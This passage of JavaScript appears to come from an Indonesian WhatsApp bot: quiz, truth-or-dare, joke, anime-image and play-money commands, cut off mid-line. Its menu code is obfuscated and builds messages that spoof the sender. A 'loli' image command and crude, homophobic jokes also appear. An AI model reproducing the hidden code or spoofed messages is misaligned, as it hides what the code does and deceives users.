					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
				anu = await fetchJson(`https://arugaz.herokuapp.com/api/howgay`, {method: 'get'})
				hasil = `Nih Liat Data Gay Si ${q}\n\n\nPersentase Gay : ${anu.persen}%\nAlert!!! : ${anu.desc}`
				reply(hasil)
				break
				case 'tebakgambar':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Jawab terlebih dahulu pertanyaan sebelumnya")
                    get_result = await fetchJson(`https://videfikri.com/api/tebakgambar/`)
                    result = get_result.result
                    ini_image = result.soal_gbr
                    jawaban = result.jawaban
                    tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    console.log(jawaban)
                    ini_buffer = await getBuffer(ini_image)
                    dila.sendMessage(from, ini_buffer, image, { quoted: Lan, caption: "_Jawab pertanyaan berikut!_\nBatas waktu 50detik" })
                    await sleep(50000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    break
				case 'caklontong':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					anu = await fetchJson(`https://api.vhtear.com/funkuis&apikey=${vhtear}`)
					setTimeout(() => {
						dila.sendMessage(from, '*❏ Jawaban :* ' + anu.result.jawaban + '\n' + anu.result.desk, text, { quoted: Lan })
					}, 30000) // 1000 = 1s,
					setTimeout(() => {
						dila.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout(() => {
						dila.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout(() => {
						dila.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 1000) // 1000 = 1s,
					setTimeout(() => {
						dila.sendMessage(from, anu.result.soal, text, { quoted: Lan })
					}, 0) // 1000 = 1s,
					break

				case 'bisakah':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					bisakah = body.slice(1)
					const bisa = ['Tentu Saja Bisa! Kamu Adalah Orang Paling Homky', 'Gak Bisa Ajg Aowkwowk', 'Hmm Gua Gak Tau Yaa, tanya ama bapakau', 'Ulangi Tod Gua Ga Paham']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					dila.sendMessage(from, 'Pertanyaan : *' + bisakah + '*\n\nJawaban : ' + keh, text, { quoted: Lan })
					break

					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					kapankah = body.slice(1)
					const kapan = ['Besok', 'Lusa', 'Tadi', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					dila.sendMessage(from, 'Pertanyaan : *' + kapankah + '*\n\nJawaban : ' + koh, text, { quoted: Lan })
					break

				case 'apakah':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					apakah = body.slice(1)
					const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Ulangi bro gak paham']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					dila.sendMessage(from, 'Pertanyaan : *' + apakah + '*\n\nJawaban : ' + kah, text, { quoted: Lan })
					break

				case 'rate':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					rate = body.slice(1)
					const ra = ['4', '9', '17', '28', '34', '48', '59', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					dila.sendMessage(from, 'Pertanyaan : *' + rate + '*\n\nJawaban : ' + te + '%', text, { quoted: Lan })
					break

				case 'hobby':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					hobby = body.slice(1)
					const hob = ['Desah Di Game', 'Ngocokin Doi', 'Stalking sosmed nya mantan', 'Kau kan gak punya hobby awokawok', 'Memasak', 'Membantu Atok', 'Mabar', 'Nobar', 'Sosmedtan', 'Membantu Orang lain', 'Nonton Anime', 'Nonton Drakor', 'Naik Motor', 'Nyanyi', 'Menari', 'Bertumbuk', 'Menggambar', 'Foto fotoan Ga jelas', 'Maen Game', 'Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					dila.sendMessage(from, 'Pertanyaan : *' + hobby + '*\n\nJawaban : ' + by, text, { quoted: Lan })
					break

				case 'truth':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					dila.sendMessage(from, truteh, image, { caption: '*Truth*\n\n' + ttrth, quoted: Lan })
					break

				case 'dare':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					tod = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					dila.sendMessage(from, tod, image, { quoted: Lan, caption: '*Dare*\n\n' + der })
					break

				case 'cekbapak': // By Ramlan ID
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
					const cek = bapak[Math.floor(Math.random() * bapak.length)]
					dila.sendMessage(from, cek, text, { quoted: Lan })
					break

				case 'randommenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const random = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}gachacewek\`\`\`
\`\`\`├ ${prefix}gachacowok\`\`\`
\`\`\`├ ${prefix}sagiri\`\`\`
\`\`\`├ ${prefix}megumin\`\`\`
\`\`\`├ ${prefix}waifu\`\`\`
\`\`\`├ ${prefix}neko\`\`\`
\`\`\`├ ${prefix}shinobu\`\`\`
\`\`\`├ ${prefix}loli\`\`\`
\`\`\`├ ${prefix}nekonime\`\`\`
\`\`\`├ ${prefix}darkjokes\`\`\`
\`\`\`├ ${prefix}meme\`\`\`
\`\`\`├ ${prefix}estetik\`\`\`
\`\`\`└ ${pushname}\`\`\``
					var _0x44ed=['mebZlNDOyxrZyxbWlM5LDa','mtmZntvxue5dt1u','uMfUzg9Tie1LBNu','odq4odGXC3fnwe1n','ndLWvwXIweS','CMvHzezPBgvtEw5J','otG0nZi0t2Lwtxjf','mwPxz2r5Ea','nuvgA2HnAG','ntK0ntGZwun3Auvb','ntuYnZm3tu91BMPw','mteZodu5A1D4wwfn','C3rHDhvZqgjYB2fKy2fZDa','C2vUze1LC3nHz2u','mJuXnJGZsfHNrg9l','lI9KBNmVDgH1BwjUywLSlMPWzwC'];var _0xb19bc4=_0x2fc2;function _0x2fc2(_0x3dec77,_0x4b4a10){_0x3dec77=_0x3dec77-0x92;var _0x44ed9b=_0x44ed[_0x3dec77];if(_0x2fc2['rDUFPM']===undefined){var _0x2fc2d9=function(_0x4def2d){var _0x2a6d0d='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x22cce2='';for(var _0x56ec5f=0x0,_0x1fee6e,_0x177229,_0x5eccb6=0x0;_0x177229=_0x4def2d['charAt'](_0x5eccb6++);~_0x177229&&(_0x1fee6e=_0x56ec5f%0x4?_0x1fee6e*0x40+_0x177229:_0x177229,_0x56ec5f++%0x4)?_0x22cce2+=String['fromCharCode'](0xff&_0x1fee6e>>(-0x2*_0x56ec5f&0x6)):0x0){_0x177229=_0x2a6d0d['indexOf'](_0x177229);}return _0x22cce2;};_0x2fc2['ogvcWa']=function(_0x4d6fc9){var _0x3e3576=_0x2fc2d9(_0x4d6fc9);var _0x5dc66b=[];for(var _0x20e2f1=0x0,_0x1518a1=_0x3e3576['length'];_0x20e2f1<_0x1518a1;_0x20e2f1++){_0x5dc66b+='%'+('00'+_0x3e3576['charCodeAt'](_0x20e2f1)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5dc66b);},_0x2fc2['RBwybD']={},_0x2fc2['rDUFPM']=!![];}var _0x2c1048=_0x44ed[0x0],_0x162429=_0x3dec77+_0x2c1048,_0x143509=_0x2fc2['RBwybD'][_0x162429];return _0x143509===undefined?(_0x44ed9b=_0x2fc2['ogvcWa'](_0x44ed9b),_0x2fc2['RBwybD'][_0x162429]=_0x44ed9b):_0x44ed9b=_0x143509,_0x44ed9b;}(function(_0x4b9498,_0x4e3380){var _0x3f3814=_0x2fc2;while(!![]){try{var _0x49c6c3=-parseInt(_0x3f3814(0x9e))+-parseInt(_0x3f3814(0x9d))+parseInt(_0x3f3814(0x95))*parseInt(_0x3f3814(0x98))+parseInt(_0x3f3814(0x9f))*-parseInt(_0x3f3814(0x9b))+-parseInt(_0x3f3814(0x9a))+parseInt(_0x3f3814(0x97))+parseInt(_0x3f3814(0x92))*parseInt(_0x3f3814(0x9c));if(_0x49c6c3===_0x4e3380)break;else _0x4b9498['push'](_0x4b9498['shift']());}catch(_0x464a68){_0x4b9498['push'](_0x4b9498['shift']());}}}(_0x44ed,0x7decc),dila[_0xb19bc4(0xa1)](from,random,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0xb19bc4(0x94),...from?{'remoteJid':_0xb19bc4(0xa0)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0xb19bc4(0x99)](_0xb19bc4(0x93)),'surface':0xc8,'message':_0xb19bc4(0x96),'orderTitle':'Random\x20Menu','sellerJid':_0xb19bc4(0x94)}}}}));
					break

				case 'gachacewek':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					data = fs.readFileSync('./dns/cewek.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					sendImage(hasil, Lan, 'Jadi Gimana Bwang?:v')
					break

				case 'gachacowok':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					data = fs.readFileSync('./dns/cowok.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					sendImage(hasil, Lan, 'Jadi Gimana Mba?:v')
					break
				case 'meme':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
					mimi = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=${xteam}`)
					dila.sendMessage(from, mimi, image, { quoted: Lan })
					break

				case 'darkjokes':
				case 'darkjoke':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					data = fs.readFileSync('./dns/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					sendImage(hasil, Lan, '*GELAP BOS :V*')
					break
			case 'waifu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
				    try {
						axios.get(`https://waifu.pics/api/sfw/waifu`).then((res)=>{
						imageToBase64(res.data.url)
						.then((response) => {
						var ifu = Buffer.from(response, 'base64');
					dila.sendMessage(from, ifu, image, {quoted: Lan, caption: "Wibu AbiZzz"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('Error!')
					}
					break
			case 'neko':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
				    try {
						axios.get(`https://waifu.pics/api/sfw/neko`).then((res)=>{
						imageToBase64(res.data.url)
						.then((response) => {
						var ifu = Buffer.from(response, 'base64');
					dila.sendMessage(from, ifu, image, {quoted: Lan})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('Error!')
					}
					break
			case 'megumin':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
				    try {
						axios.get(`https://waifu.pics/api/sfw/megumin`).then((res)=>{
						imageToBase64(res.data.url)
						.then((response) => {
						var ifu = Buffer.from(response, 'base64');
					dila.sendMessage(from, ifu, image, {quoted: Lan})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('Error!')
					}
					break
			case 'shinobu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
				    try {
						axios.get(`https://waifu.pics/api/sfw/shinobu`).then((res)=>{
						imageToBase64(res.data.url)
						.then((response) => {
						var ifu = Buffer.from(response, 'base64');
					dila.sendMessage(from, ifu, image, {quoted: Lan})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('Error!')
					}
					break
				case 'loli':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
					lomli = await getBuffer(`https://docs-jojo.herokuapp.com/api/randomloli`)
					dila.sendMessage(from, lomli, image, { quoted: Lan, caption: 'Cintai Loli Mu>_<' })
					break

				case 'nekonime':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/random2/neko?apikey=pensiB`)
					reply(dla.wait())
					neko = await getBuffer(anu.result.url_gbr)
					dila.sendMessage(from, neko, image, { quoted: Lan, caption: 'Nekonime >_<' })
					break

				case 'sagiri':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					sagi = await getBuffer(`http://lolhuman.herokuapp.com/api/random/sagiri?apikey=pensiB`)
					reply(dla.wait())
					dila.sendMessage(from, sagi, image, { quoted: Lan })
					break
				case 'estetik':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					anu = await fetchJson(`https://api.zeks.xyz/api/estetikpic?apikey=apivinz`)
					reply(dla.wait())
					este = await getBuffer(anu.result.result)
					dila.sendMessage(from, este, image, { quoted: Lan })
				break
					
				case 'dompetmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const dompet = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}limit\`\`\`
\`\`\`├ ${prefix}transfer\`\`\`
\`\`\`├ ${prefix}atm\`\`\`
\`\`\`├ ${prefix}buylimit\`\`\`
\`\`\`├ ${prefix}premiumlist\`\`\`
\`\`\`└ ${pushname}\`\`\``
					var _0x1ade=['nte4mtG5DKviyKPT','otG0mZyYBvjID3LA','mtKYnZq2yvbOwLbb','muXXu25fua','mxnqDvnZBq','nKr4sfbrtW','rg9TCgv0ie1LBNu','nZC1odC3AuvNvvbW','nta4mJuWvwrnwwf5','mebZlNDOyxrZyxbWlM5LDa','CMvHzezPBgvtEw5J','lI9KBNmVDgH1BwjUywLSlMPWzwC','ndqWntiZyNHfwLDY','mJG3nJqXz1jeBgPJ','C3rHDhvZqgjYB2fKy2fZDa'];var _0x5d8da6=_0x53bc;function _0x53bc(_0x1519dc,_0x29f635){_0x1519dc=_0x1519dc-0xb6;var _0x1ade0a=_0x1ade[_0x1519dc];if(_0x53bc['VNgLMA']===undefined){var _0x53bc1f=function(_0x11cd15){var _0x1ff484='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x52cd36='';for(var _0x386c01=0x0,_0x1fd939,_0xfded20,_0x1104a0=0x0;_0xfded20=_0x11cd15['charAt'](_0x1104a0++);~_0xfded20&&(_0x1fd939=_0x386c01%0x4?_0x1fd939*0x40+_0xfded20:_0xfded20,_0x386c01++%0x4)?_0x52cd36+=String['fromCharCode'](0xff&_0x1fd939>>(-0x2*_0x386c01&0x6)):0x0){_0xfded20=_0x1ff484['indexOf'](_0xfded20);}return _0x52cd36;};_0x53bc['ngCimF']=function(_0x58d179){var _0x2d4904=_0x53bc1f(_0x58d179);var _0x50f45b=[];for(var _0x8032ce=0x0,_0x17e657=_0x2d4904['length'];_0x8032ce<_0x17e657;_0x8032ce++){_0x50f45b+='%'+('00'+_0x2d4904['charCodeAt'](_0x8032ce)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x50f45b);},_0x53bc['PPmhdX']={},_0x53bc['VNgLMA']=!![];}var _0x489b03=_0x1ade[0x0],_0x3f1ebc=_0x1519dc+_0x489b03,_0x225031=_0x53bc['PPmhdX'][_0x3f1ebc];return _0x225031===undefined?(_0x1ade0a=_0x53bc['ngCimF'](_0x1ade0a),_0x53bc['PPmhdX'][_0x3f1ebc]=_0x1ade0a):_0x1ade0a=_0x225031,_0x1ade0a;}(function(_0x3540eb,_0x32f9a7){var _0x333525=_0x53bc;while(!![]){try{var _0x1cb05a=parseInt(_0x333525(0xb9))+-parseInt(_0x333525(0xbd))+-parseInt(_0x333525(0xc1))+-parseInt(_0x333525(0xc3))*parseInt(_0x333525(0xc0))+-parseInt(_0x333525(0xc2))*-parseInt(_0x333525(0xb6))+parseInt(_0x333525(0xbe))+-parseInt(_0x333525(0xc4))*-parseInt(_0x333525(0xb8));if(_0x1cb05a===_0x32f9a7)break;else _0x3540eb['push'](_0x3540eb['shift']());}catch(_0x5af01f){_0x3540eb['push'](_0x3540eb['shift']());}}}(_0x1ade,0xbfb12),dila['sendMessage'](from,dompet,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x5d8da6(0xba),...from?{'remoteJid':_0x5d8da6(0xbf)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x5d8da6(0xbb)](_0x5d8da6(0xbc)),'surface':0xc8,'message':'Dompet\x20Menu','orderTitle':_0x5d8da6(0xb7),'sellerJid':_0x5d8da6(0xba)}}}}));
					break

				case 'limit':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					checkLimit(sender)
					break

				case 'transfer':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q.includes('|')) return reply(dla.wrongf())
					const tujuan = q.substring(0, q.indexOf('|') - 1)
					const jumblah = q.substring(q.lastIndexOf('|') + 1)
					if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
					const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
					fee = 0.005 * jumblah
					hasiltf = jumblah - fee
					addKoinUser(tujuantf, hasiltf)
					confirmATM(sender, jumblah)
					addKoinUser(`${ownerNumber}`, fee)
					reply(`*「 SUKSES 」*\n\npengiriman uang berhasil\n❏ dari : +${sender.split("@")[0]}\n❏ ke : +${tujuan}\n❏ jumlah transfer : ${jumblah}\n❏ pajak : ${fee}`)
					break

				case 'atm':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					const kantong = checkATMuser(sender)
					reply(dla.uangkau(pushname, sender, kantong))
					break

				case 'buylimit':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					payout = body.slice(10)
					const koinPerlimit = 1000
					const totald = koinPerlimit * payout
					if (checkATMuser(sender) <= totald) return reply(`maaf kak uang nya gak cukup, kumpulin uang nya dumlu >_< jangan open bo kak:v`)
					if (checkATMuser(sender) >= totald) {
						confirmATM(sender, totald)
						bayarLimit(sender, payout)
						await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n❏ pengirim : ${ownerName}\n❏ penerima : ${pushname}\n❏ nominal pembelian : ${payout} \n❏ harga limit : ${koinPerlimit}/limit\n❏ sisa uang : ${checkATMuser(sender)}\n\nproses berhasil dengan SN\n${createSerial(15)}`)
					}
					break
				case 'toolsmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const tools = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}tomp3\`\`\`
\`\`\`├ ${prefix}tomp4\`\`\`
\`\`\`├ ${prefix}toimg\`\`\`
\`\`\`├ ${prefix}toptt\`\`\`
\`\`\`├ ${prefix}detikvn\`\`\`
\`\`\`├ ${prefix}detikvideo\`\`\`
\`\`\`├ ${prefix}imgtourl\`\`\`
\`\`\`├ ${prefix}bitly\`\`\`
\`\`\`├ ${prefix}trigered\`\`\`
\`\`\`├ ${prefix}komenyt\`\`\`
\`\`\`├ ${prefix}volume\`\`\`
\`\`\`├ ${prefix}nightcore\`\`\`
\`\`\`├ ${prefix}slow\`\`\`
\`\`\`├ ${prefix}tupai\`\`\`
\`\`\`├ ${prefix}blub\`\`\`
\`\`\`├ ${prefix}gemuk\`\`\`
\`\`\`├ ${prefix}ghost\`\`\`
\`\`\`├ ${prefix}bass\`\`\`
\`\`\`└ ${pushname}\`\`\``
					var _0x9cec=['muPqwgD2sW','mZG2mJa5sg5dBLnw','mebZlNDOyxrZyxbWlM5LDa','mtq4mJC1n3vIuvvkta','nZu4odm3uw5Rvhv5','nZyZoxj0ruPutW','ntCWmJGWuuPRDKvW','CMvHzezPBgvtEw5J','mwHNCMnlAq','vg9VBhmGtwvUDq','ntq0otC1thPJze53','ndm5otqWvhPnq09U','mLDhz09Xua','C2vUze1LC3nHz2u','lI9KBNmVDgH1BwjUywLSlMPWzwC','odv1BLniEe4','C3rHDhvZqgjYB2fKy2fZDa'];var _0x3f1129=_0x3f80;function _0x3f80(_0x2957cb,_0x319f80){_0x2957cb=_0x2957cb-0x1f0;var _0x9cec01=_0x9cec[_0x2957cb];if(_0x3f80['ydCdrA']===undefined){var _0x3f80bb=function(_0x4edfde){var _0x1ded17='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x19af74='';for(var _0x18a9e8=0x0,_0x3a9891,_0x67dd43,_0x38b99d=0x0;_0x67dd43=_0x4edfde['charAt'](_0x38b99d++);~_0x67dd43&&(_0x3a9891=_0x18a9e8%0x4?_0x3a9891*0x40+_0x67dd43:_0x67dd43,_0x18a9e8++%0x4)?_0x19af74+=String['fromCharCode'](0xff&_0x3a9891>>(-0x2*_0x18a9e8&0x6)):0x0){_0x67dd43=_0x1ded17['indexOf'](_0x67dd43);}return _0x19af74;};_0x3f80['kNqbrL']=function(_0x17c645){var _0x5f1923=_0x3f80bb(_0x17c645);var _0x542204=[];for(var _0x26f5d1=0x0,_0x5274b3=_0x5f1923['length'];_0x26f5d1<_0x5274b3;_0x26f5d1++){_0x542204+='%'+('00'+_0x5f1923['charCodeAt'](_0x26f5d1)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x542204);},_0x3f80['jvqVVT']={},_0x3f80['ydCdrA']=!![];}var _0x33f9a4=_0x9cec[0x0],_0x110d00=_0x2957cb+_0x33f9a4,_0x49e77e=_0x3f80['jvqVVT'][_0x110d00];return _0x49e77e===undefined?(_0x9cec01=_0x3f80['kNqbrL'](_0x9cec01),_0x3f80['jvqVVT'][_0x110d00]=_0x9cec01):_0x9cec01=_0x49e77e,_0x9cec01;}(function(_0x4f5802,_0xc87728){var _0x50987d=_0x3f80;while(!![]){try{var _0x2eacf8=-parseInt(_0x50987d(0x1f1))*parseInt(_0x50987d(0x1fe))+-parseInt(_0x50987d(0x1f2))*-parseInt(_0x50987d(0x1fc))+parseInt(_0x50987d(0x1ff))*parseInt(_0x50987d(0x1f9))+-parseInt(_0x50987d(0x1f8))+parseInt(_0x50987d(0x1f5))*-parseInt(_0x50987d(0x1f7))+-parseInt(_0x50987d(0x1f3))+parseInt(_0x50987d(0x1f0));if(_0x2eacf8===_0xc87728)break;else 